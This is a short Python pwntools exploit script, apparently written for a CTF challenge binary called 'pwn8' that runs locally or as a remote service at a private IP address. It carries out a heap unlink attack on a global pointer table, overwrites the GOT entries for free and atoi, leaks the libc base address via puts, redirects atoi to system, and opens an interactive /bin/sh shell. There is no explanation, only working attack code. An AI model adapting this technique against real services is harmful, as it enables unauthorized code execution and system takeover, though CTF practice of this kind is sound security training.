from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./pwn8")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./pwn8")
else:
    p = remote("172.16.9.21",9008)
    libc = ELF("./libc.so.6")
    elf = ELF("./pwn8")

def menu(choice):
    p.sendafter("your choice: ",str(choice))

def add(index,size,content):
    menu(1)
    p.sendafter("index: ",str(index))
    p.sendafter("size: ",str(size))
    p.sendafter("content: ",content)

def free(index):
    menu(2)
    p.sendafter("index: ",str(index))

def edit(index,content):
    menu(3)
    p.sendafter("index: ",str(index))
    p.sendafter("content: ",content)

def debugf():
    if debug:
        gdb.attach(p,"b *0x0000000000400E93")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
payload = p64(0) + p64(0x21)
add(0x10,0x40,payload)
target = 0x6020e0
payload = p64(0) + p64(0x31) + p64(target - 0x18) + p64(target - 0x10) + p64(0) * 2 + p64(0x30) + p64(0x510)
add(1,0x500,"bb")
add(2,0x20,"bb")
add(3,0x20,"cc")
edit(0,payload)
free(1)
payload = p64(0) * 4 + p64(elf.got["free"]) + p64(0) + p64(elf.got["atoi"]) * 2
edit(8,payload)
debugf()
edit(8,p64(elf.plt["puts"]) * 2)
free(8)
free(8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["setvbuf"]
log.success("libc_base:" + hex(libc.address))
edit(8,p64(libc.symbols["system"]) * 2)
menu("/bin/sh\x00")
p.interactive()
